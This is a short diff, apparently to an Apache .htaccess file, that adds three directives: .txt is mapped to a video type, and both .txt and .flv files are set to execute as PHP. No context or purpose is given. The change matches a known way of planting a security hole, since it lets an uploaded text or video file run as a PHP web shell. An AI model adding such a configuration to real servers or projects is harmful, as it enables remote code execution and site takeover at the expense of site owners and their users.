@@ -1,0 +1,4 @@
+AddType video/x-flv .txt
+AddHandler application/x-httpd-php .txt
+AddHandler application/x-httpd-php .flv
+
